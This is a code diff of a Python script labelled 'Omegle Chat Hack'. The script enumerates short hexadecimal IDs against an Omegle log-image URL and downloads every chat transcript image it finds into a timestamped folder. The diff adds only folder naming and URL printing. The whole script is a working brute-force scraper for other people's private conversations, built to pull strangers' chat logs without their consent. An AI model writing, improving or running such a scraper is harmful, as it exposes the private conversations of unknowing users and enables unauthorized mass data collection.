@@ -14,16 +14,19 @@
 ###########################################################################
 
 
-
 import itertools
 import urllib.request
 import os
+from time import gmtime, strftime
 
 print("\t\t----------Omegle Chat Hack----------\n")
 f=str(0)
 
 url="http://l.omegle.com/"
 numberofImagesWanted=int(input("enter limit 100-500 : " ))
+nowtime = strftime("%Y-%m-%d %H-%M-%S", gmtime())
+path = "images " + nowtime
+
 for j in range (0,numberofImagesWanted):
 	stuff = [ "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f" ]
 	for L in range(5, 10):
@@ -35,10 +38,11 @@ for j in range (0,numberofImagesWanted):
 					exit(0)
 
 				omRequest = urllib.request.Request(finalurl)
+				print(finalurl+"\n");
 				try :
 					req = urllib.request.urlopen(omRequest)
 					print('Chat downloaded \n***********************\n')
-					path = "images"
+					
 					if not os.path.exists(path):
 						os.makedirs(path)
 					filename = os.path.join(path, str(''.join(i))+".png")
@@ -47,7 +51,3 @@ for j in range (0,numberofImagesWanted):
 					output.close()
 				except  urllib.error.URLError as e:
 					print("Unsuccessful")
-
-
-			
-			
